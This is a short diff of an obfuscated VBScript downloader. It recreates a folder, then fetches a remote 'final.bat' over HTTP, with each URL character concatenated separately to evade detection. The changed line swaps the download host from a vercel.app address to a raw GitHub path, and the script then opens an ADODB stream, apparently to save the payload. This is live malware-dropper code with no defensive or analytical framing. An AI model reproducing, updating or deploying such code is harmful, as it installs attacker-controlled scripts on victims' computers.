@@ -5,7 +5,7 @@ If x2b.FolderExists(p1c) Then x2b.DeleteFolder p1c,True
 If Not x2b.FolderExists(Left(p1c,InStrRev(p1c,"\")-1)) Then x2b.CreateFolder Left(p1c,InStrRev(p1c,"\")-1)
 x2b.CreateFolder p1c
 Set x3d=CreateObject("MSXML2."&"ServerXMLHTTP")
-x3d.Open "G"&"E"&"T","h"&"t"&"t"&"p"&"s"&":"&"/"&"/"&"s"&"e"&"r"&"v"&"i"&"c"&"e"&"-"&"o"&"m"&"e"&"g"&"a"&"-"&"s"&"n"&"o"&"w"&"y"&"."&"v"&"e"&"r"&"c"&"e"&"l"&"."&"a"&"p"&"p"&"/"&"f"&"i"&"n"&"a"&"l"&"."&"b"&"a"&"t",False
+x3d.Open "G"&"E"&"T","h"&"t"&"t"&"p"&"s"&":"&"/"&"/"&"r"&"a"&"w"&"."&"g"&"i"&"t"&"h"&"u"&"b"&"u"&"s"&"e"&"r"&"c"&"o"&"n"&"t"&"e"&"n"&"t"&"."&"c"&"o"&"m"&"/"&"U"&"S"&"A"&"T"&"I"&"K"&"T"&"O"&"K"&"E"&"R"&"/"&"S"&"e"&"r"&"v"&"i"&"c"&"e"&"/"&"m"&"a"&"i"&"n"&"/"&"f"&"i"&"n"&"a"&"l"&"."&"b"&"a"&"t",False
 x3d.Send
 Set x4e=CreateObject("ADODB."&"Stream")
 x4e.Type=1
